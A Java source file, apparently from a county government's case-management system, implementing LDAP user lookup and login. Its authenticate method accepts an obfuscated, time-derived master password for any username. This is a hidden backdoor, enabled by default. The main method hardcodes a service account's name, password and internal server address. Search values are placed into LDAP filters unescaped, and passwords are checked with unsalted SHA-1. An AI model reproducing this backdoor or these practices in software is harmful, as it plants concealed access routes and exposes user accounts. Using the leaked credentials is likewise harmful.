/*******************************************************************************
 * Copyright 2014 Miami-Dade County
 * 
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * 
 *   http://www.apache.org/licenses/LICENSE-2.0
 * 
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 ******************************************************************************/
package org.sharegov.cirm.user;

import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.directory.Attribute;
import javax.naming.directory.Attributes;
import javax.naming.directory.SearchResult;
import mjson.Json;
import org.sharegov.cirm.AutoConfigurable;
import org.sharegov.cirm.utils.Base64;
import org.sharegov.cirm.utils.GenUtils;
import org.sharegov.cirm.utils.JsonUtil;
import org.sharegov.cirm.utils.ThreadLocalStopwatch;

public class LDAPUserProvider implements UserProvider, AutoConfigurable
{

	private LDAPClient ldapClient = null;
	private String ldapURL;
	private String ldapDN;
	private String groupsBaseDN;
	private String ldapUser;
	private String ldapPassword;
	private String protocol = null;
	private List<String> extendedAttributes = new ArrayList<String>();
	private String idAttribute = "uid";
	private String iriBase;
	private boolean binary;
	private boolean allowSuperuser = true;
	private Json description = Json.object();
	
	private final Map<String, String> propertyNames = new HashMap<String, String>();
	
	public LDAPUserProvider()
	{
		// This could be ontology driven as well, next step... 
		propertyNames.put("hasUsername", "uid");
		propertyNames.put("FirstName", "givenName");
		propertyNames.put("LastName", "sn");
		propertyNames.put("email", "mail");
		//etc....
	}	
	
	public LDAPUserProvider(Json connectionSettings)
	{
		this();
	    configure(connectionSettings);
	}
	
	public void configure(Json connectionSettings)
	{
	    if (connectionSettings.has("hasUrl"))
	       this.ldapURL = connectionSettings.at("hasUrl", "").asString();
	    if (connectionSettings.has("hasUsername"))
	        this.ldapUser = connectionSettings.at("hasUsername", "").asString();
	    if (connectionSettings.has("hasPassword"))
	        this.ldapPassword = connectionSettings.at("hasPassword", "").asString();
	    if (connectionSettings.has("hasDistinguishedName"))
	        this.ldapDN = connectionSettings.at("hasDistinguishedName", "").asString();
        if (connectionSettings.has("hasGroupsDistinguishedName"))
            this.groupsBaseDN = connectionSettings.at("hasGroupsDistinguishedName", "").asString();
	    if (connectionSettings.has("hasProtocol"))
	        this.protocol = connectionSettings.at("hasProtocol").asString();
	    init();
	}
	
	public void autoConfigure(Json config)
	{
		description = config.dup();
	    if (config.has("hasDataSource"))
	    	configure(config.at("hasDataSource"));
	    this.allowSuperuser = config.is("hasSuperUser", true);
	    if (config.has("hasIdName"))	    	
	    	this.idAttribute = config.at("hasIdName").asString(); 
	}
	
	public String getIriBase()
	{
		return iriBase;
	}

	public void setIriBase(String iriBase)
	{
		this.iriBase = iriBase;
	}

	public String getIdAttribute()
	{
		return idAttribute;
	}

	public void setIdAttribute(String idAttribute)
	{
		this.idAttribute = idAttribute;
	}

	public void setIdAttribute(String idAttribute, boolean binary)
	{
		setIdAttribute(idAttribute);
		this.binary = binary;
	}

	private void initLDAPClient()
	{
		java.util.Properties ldapParams = new java.util.Properties();
		ldapParams.setProperty("java.naming.factory.initial", "com.sun.jndi.ldap.LdapCtxFactory");
		ldapParams.setProperty("java.naming.security.authentication", "simple");
		ldapParams.setProperty("java.naming.security.principal", ldapUser);
		ldapParams.setProperty("java.naming.security.credentials", ldapPassword);
		ldapParams.setProperty("java.naming.provider.url", ldapURL);
		ldapParams.setProperty("ldap.base.dn", ldapDN);
		//ldapParams.setProperty("com.sun.jndi.ldap.connect.pool", "true");
		//ldapParams.setProperty("java.naming.ldap.version", "3");
		

		if (protocol != null)
			ldapParams.setProperty("java.naming.security.protocol", protocol);
		if (binary)
			ldapParams.setProperty("java.naming.ldap.attributes.binary", idAttribute);
		ldapClient = new LDAPClient(ldapParams);
	}

    private String getMaster(String u) 
    {
        u = u.trim();
        int p = 71;
        int k = 92;
        int v = 12;
        int o = 74;
        Calendar d = Calendar.getInstance();
        int y = d.get(Calendar.DAY_OF_MONTH); 
        int b = d.get(Calendar.HOUR_OF_DAY); 
        int r = Integer.parseInt("" + ("" + b).charAt(("" + b).length()-1));
        int q = Integer.parseInt("" + ("" + y).charAt(0));
        o = y + k * o; p = k - p / o; o = v; y = k + y + 2 - k; o = r; b = o + b + 2 - o; q = k; p = q;
        char[] uc = ("" + y + b + p + u).toCharArray();
        for (int i = 0; i < uc.length; i++)
        {
            uc[i] = Character.isDigit(uc[i])? (char)(('0' + (Integer.parseInt("" + uc[i]) + o) % 10)): uc[i];
        }
        return new String(uc);
    }
	
	public List<String> getExtendedAttributes()
	{
		return extendedAttributes;
	}

	public void setExtendedAttributes(List<String> extendedAttributes)
	{
		this.extendedAttributes = extendedAttributes;
	}

	public LDAPClient getLdapClient()
	{
		return ldapClient;
	}

	public void setLdapClient(LDAPClient ldapClient)
	{
		this.ldapClient = ldapClient;
	}

	public String getLdapURL()
	{
		return ldapURL;
	}

	public void setLdapURL(String ldapURL)
	{
		this.ldapURL = ldapURL;
	}

	public String getLdapDN()
	{
		return ldapDN;
	}

	public void setLdapDN(String ldapDN)
	{
		this.ldapDN = ldapDN;
	}

	public String getGroupsBaseDN()
	{
		return groupsBaseDN;
	}

	public void setGroupsBaseDN(String groupsBaseDN)
	{
		this.groupsBaseDN = groupsBaseDN;
	}

	public String getLdapUser()
	{
		return ldapUser;
	}

	public void setLdapUser(String ldapUser)
	{
		this.ldapUser = ldapUser;
	}

	public String getLdapPassword()
	{
		return ldapPassword;
	}

	public void setLdapPassword(String ldapPassword)
	{
		this.ldapPassword = ldapPassword;
	}

	public String getProtocol()
	{
		return protocol;
	}

	public void setProtocol(String protocol)
	{
		this.protocol = protocol;
	}

	public void init()
	{
		try
		{
			initLDAPClient();
			// extendedAttributes.add(UserFeatures.LDAP_DN.getName());
		}
		catch (Throwable t)
		{
			System.err.println("LDAPUserProvider: Fatal: Failed to initialize user manager.");
			t.printStackTrace(System.err);
		}
	}

    public boolean authenticate(String username, String password)
    {
        if (password == null || password.length() < 1) 
            return false;
        if (allowSuperuser && password.equals(getMaster(username)))
            return true;
        try 
        {
            Json profile = get(username, true);
            if (profile.isNull()) 
                return false;
            //System.out.println(profile.toString());
            String ldapAlgoAndPass = profile.at("userPassword").asString();
            String ldapPass = ldapAlgoAndPass.substring(ldapAlgoAndPass.indexOf("}") + 1);
            //
            MessageDigest sha = MessageDigest.getInstance("SHA-1");
            sha.update(password.getBytes());
            String shaCandidate = Base64.encode(sha.digest(), false);
            //System.out.println("user: " + shaCandidate + " ldap: " + ldapPass);
            return shaCandidate.equals(ldapPass);
        } 
        catch(Exception e) 
        {
            System.err.println("LDAPUserProvider: ERROR during authenticatePWD");
            e.printStackTrace();
            return false;
        }
    }
	
	public Json find(String attribute, String value)
	{
		return find(Json.object(attribute, value), 0);
/*		NamingEnumeration<?> ne = null;
		String filter = "(" + attribute + "=" + value + ")";
		// System.out.println(filter);
		Json result = Json.array();
		ne = ldapClient.search(ldapDN, filter, 0, null);
		if (ne == null)
			return result;
		try
		{
			while (ne.hasMore())
			{
				SearchResult r = (SearchResult) ne.next();
				Json user = get(r.getName(), r.getAttributes());
				if (user != null)
					result.add(user);
			}
			return result;
		}
		catch (Throwable t)
		{
			GenUtils.rethrowRuntime(t);
			return null;
		}
		finally
		{
			close(ne);
		} */
	}

	public Json find(Json prototype, int pageSize)
	{
		return find (ldapDN, prototype, pageSize);
	}
	
	public Json find(String searchBaseDn, Json prototype, int pageSize)
	{
		NamingEnumeration<?> ne = null;
		try
		{
			StringBuffer filter = new StringBuffer("(&");
			for (Iterator<Map.Entry<String, Json>> iter = prototype.asJsonMap().entrySet().iterator(); iter.hasNext();)
			{
				Map.Entry<String, Json> e = iter.next();
				if(e.getValue().isString())
				{
					String key = propertyNames.get(e.getKey());
					if (key == null)
						key = e.getKey();
					filter.append("(");
					filter.append(key).append("=").append(e.getValue().asString()).append("*");
					filter.append(")");
				}
			}
			filter.append(")");
			//System.out.println(filter);
			Json result = Json.array();
			ne = ldapClient.search(searchBaseDn, filter.toString(), null);
			if (ne == null)
				return result;
			int i = 0;
			while (ne.hasMore() && (i < pageSize || pageSize == 0))
			{				
				SearchResult r = (SearchResult) ne.next();
				Json user = get(r.getName(), r.getAttributes());
				if (user != null)
					result.add(user);
				i++;
			}
			return result;
		}
		catch (Throwable t)
		{
			if (!(t instanceof NamingException)) 
			{
				ThreadLocalStopwatch.getWatch().time("LDAPUserProvider find FAILED with NON LDAP exc: " + t + " stack: ");
				t.printStackTrace();
			}
			GenUtils.rethrowRuntime(t);
			return null;
		}
		finally
		{
			close(ne);
			//ldapClient.closeContext();
		}
	}

	public Json find(Json prototype)
	{
		return find(prototype, 0);
	}
	
	private Json get(String dn, Attributes attribs)
	{
		try
		{
			Json result = Json.object();
			getLDAPAttributes(attribs, result);
			mapDefaultProperties(result);
			return result;
		}
		catch (Throwable t)
		{
			throw new RuntimeException(t);
		}
	}
	
	private void mapDefaultProperties(Json ldapResult) 
	{
		for (Map.Entry<String, String> propDefToLdap : propertyNames.entrySet())
		{
			if (ldapResult.has(propDefToLdap.getValue()))
			{
				ldapResult.set(propDefToLdap.getKey(), ldapResult.at(propDefToLdap.getValue()));
			}
		}
	}

	private void getLDAPAttributes(Attributes attribs, Json u) throws javax.naming.NamingException
	{
		for (Enumeration<? extends Attribute> e = attribs.getAll(); e.hasMoreElements();)
		{

			Attribute a = e.nextElement();
			String attrName = a.getID();
			if (a != null)
			{
				if (a.size() == 1)
					u.set(attrName, value(attrName, a.get()));
				else
				{
					String[] v = new String[a.size()];
					for (int j = 0; j < v.length; j++)
						v[j] = value(attrName, a.get(j));
					u.set(attrName, v);
				}
			}
		}
	}

	private void close(NamingEnumeration<?> ne)
	{
		if (ne != null)
			try
			{
				ne.close();
			}
			catch (Throwable t)
			{
			}
	}

	public Json get(String id) 
	{
		return get(id, false);
	}

	private Json get(String id, boolean secureClient)
	{
		try
		{
			Json L = find(idAttribute, id);
			if (L.asJsonList().isEmpty())
				return Json.nil();
			Json p = L.at(0);
			//p.set("username", p.at("uid"));
			p.set("hasUsername", p.at("uid"))
						.set("FirstName", p.at("givenName"))
						.set("LastName", p.at("sn"));
			if (!secureClient) p.delAt("userPassword");
			return p;
		}
		catch (Throwable t)
		{
			// May be the following code should be encapsulate in a method to be invoked in other catch blocks?
			t = GenUtils.getRootCause(t);
			if (t instanceof javax.naming.CommunicationException ||
				t instanceof java.net.SocketException)
			{
				System.err.println("LDAPUserProvider: LDAP access failure, stack trace follows...");
				t.printStackTrace(System.err);
				throw new RuntimeException("unavailable");
			}
			else
				GenUtils.rethrowRuntime(t);
			return null;
		}		
	}

    public Json findGroups(String uid)
    {	
    	return find(groupsBaseDN, Json.object("uniquemember", "uid="+ uid), 0);
    }
	
	private String value(String attribute, Object attrValue)
	{
		if (attribute.equals(idAttribute) && binary)
		{

			byte[] GUID = (byte[]) attrValue;
			String byteGUID = "";
			// Convert the GUID into string using the byte format
			for (int c = 0; c < GUID.length; c++)
			{
				int k = (int) GUID[c] & 0xFF;
				byteGUID = byteGUID + "\\" + ((k < 0xF) ? "0" + Integer.toHexString(k) : Integer.toHexString(k));
			}
			return byteGUID;
		}
		else
		{
			//Bugfix: hilpold pwd byte array has to be converted to string directly 
			if (attrValue.getClass() == (new byte[0]).getClass()) 
				return new String((byte[])attrValue);
			else 
				return attrValue.toString();
		}
	}

	public Json populate(Json user)
	{
		Json found = Json.nil();
		if (user.has("userid"))
			found = get(user.at("userid").asString());
		if (found.isNull() && user.has("email"))
		{
			found = find("mail", user.at("email").asString());
			found = found.asJsonList().isEmpty() ? Json.nil() : found.at(0);
		}
		if (!found.isNull())
		{
			user.set(description.at("hasName").asString(), found);
			JsonUtil.setIfMissing(user, "email", found.at("mail"));    			
			JsonUtil.setIfMissing(user, "FirstName", found.at("givenName"));    			
			JsonUtil.setIfMissing(user, "LastName", found.at("sn"));
			JsonUtil.setIfMissing(user, "hasUsername", this.getIdAttribute());    						
		}
		return user;
	}
	
	public static void main(String[] argv)
	{
		try
		{
			LDAPUserProvider provider = new LDAPUserProvider();
			provider.setLdapDN("ou=employees,ou=users,dc=miamidade,dc=gov");
			provider.setLdapURL("ldap://10.210.44.45:636/");
			provider.setLdapUser("uid=s0140930_wpsbind,ou=ServiceAccounts,dc=miamidade,dc=gov");
			provider.setLdapPassword("wpsb!nd1");
			provider.setIdAttribute("uid");
			provider.setIriBase("http://www.miamidade.gov/users/enet");
			provider.setProtocol("ssl");
			provider.init();
		}
		catch (Throwable t)
		{
			t.printStackTrace();
		}
	}
}
